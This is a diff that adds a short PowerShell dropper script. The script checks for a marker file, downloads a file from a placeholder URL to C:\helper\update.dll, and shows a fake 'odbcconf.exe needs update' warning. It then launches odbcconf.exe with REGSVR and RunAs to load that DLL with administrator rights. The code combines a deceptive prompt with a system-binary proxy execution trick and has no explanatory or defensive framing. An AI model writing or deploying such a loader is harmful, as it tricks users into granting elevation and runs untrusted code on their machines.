@@ -1,0 +1,8 @@
+if (Test-Path "C:\helper\regex.exe") {
+    exit
+} else { wget "githubpayload" -o "C:\helper\update.dll" ; start-sleep 2;
+    Add-Type -AssemblyName System.Windows.Forms
+    [System.Windows.Forms.MessageBox]::Show("odbcconf.exe needs update", "Update Required", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+
+    Start-Process odbcconf.exe -ArgumentList 'REGSVR "C:\helper\update.dll"' -Verb RunAs
+}
